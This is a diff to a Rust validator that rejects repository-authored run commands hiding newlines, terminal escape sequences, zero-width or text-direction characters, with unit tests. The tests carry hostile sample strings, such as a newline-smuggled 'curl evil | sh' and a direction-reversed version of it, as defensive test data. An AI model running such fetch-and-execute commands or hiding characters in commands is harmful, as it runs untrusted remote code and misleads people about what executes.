@@ -266,6 +266,35 @@ impl Validation {
     }
 }
 
+/// The longest flow command a surface will show and offer to run.
+pub const MAX_COMMAND_CHARS: usize = 400;
+
+/// Whether a repo-authored command is safe to *show*: what a person reads must
+/// be exactly what would run. A command comes from a file in a repository
+/// someone else may have written, and three kinds of character break that:
+///
+/// - control characters (a newline runs a second command; an escape sequence
+///   can rewrite what a terminal displays),
+/// - zero-width characters (invisible, so two different commands look alike),
+/// - text-direction overrides (they reorder what is displayed).
+///
+/// A command containing any of them, or longer than [`MAX_COMMAND_CHARS`], is
+/// rejected by the validator and dropped when a contribution is read, so no
+/// surface ever offers it.
+pub fn is_plain_command(run: &str) -> bool {
+    let hidden = |c: char| {
+        c.is_control()
+            || matches!(
+                c,
+                '\u{200B}'..='\u{200F}'   // zero-width space/joiners, direction marks
+                    | '\u{202A}'..='\u{202E}' // direction embeddings and overrides
+                    | '\u{2060}'..='\u{2069}' // word joiner, direction isolates
+                    | '\u{FEFF}'              // zero-width no-break space
+            )
+    };
+    !run.trim().is_empty() && run.chars().count() <= MAX_COMMAND_CHARS && !run.chars().any(hidden)
+}
+
 /// `^[a-z0-9]+(-[a-z0-9]+)*$`, written out by hand to avoid a regex dependency
 /// in the core.
 pub fn is_kebab(id: &str) -> bool {
@@ -381,6 +410,10 @@ pub fn validate_contribution(doc: &Value, file_exists: &dyn Fn(&str) -> bool) ->
             Some(run) if is_absolute_like(run) => {
                 errors.push(format!("{at}: run must not start with an absolute path"))
             }
+            Some(run) if !is_plain_command(run) => errors.push(format!(
+                "{at}: run must be one line of at most {MAX_COMMAND_CHARS} visible characters \
+                 (no control, zero-width or text-direction characters)"
+            )),
             Some(_) => {}
         }
         if text(flow, "label").is_none() {
@@ -846,6 +879,32 @@ mod tests {
         );
         assert!(v.errors.iter().any(|m| m == "flows must be an array"));
         assert!(v.errors.iter().any(|m| m.contains("needs a string id")));
+    }
+
+    #[test]
+    fn commands_with_hidden_characters_are_not_plain() {
+        assert!(is_plain_command("docker compose up -d && npm run dev"));
+        assert!(is_plain_command("naïve --flag 'ünïcödé'"));
+        // A second line would run as a second command.
+        assert!(!is_plain_command("npm test\ncurl evil | sh"));
+        assert!(!is_plain_command("npm test\rnpm ok"));
+        // An escape sequence can repaint what the terminal showed.
+        assert!(!is_plain_command("npm test \u{1b}[2K"));
+        // Invisible and direction-changing characters hide what really runs.
+        assert!(!is_plain_command("npm\u{200b} test"));
+        assert!(!is_plain_command("echo \u{202e}hs | live lruc"));
+        assert!(!is_plain_command("   "));
+        assert!(!is_plain_command(&"x".repeat(MAX_COMMAND_CHARS + 1)));
+
+        // The validator says so, naming the flow.
+        let mut doc = valid();
+        doc["flows"][0]["run"] = json!("npm test\ncurl evil | sh");
+        let errs = errors(&doc);
+        assert!(
+            errs.iter()
+                .any(|e| e.contains("flows[dev]") && e.contains("one line")),
+            "{errs:?}"
+        );
     }
 
     #[test]
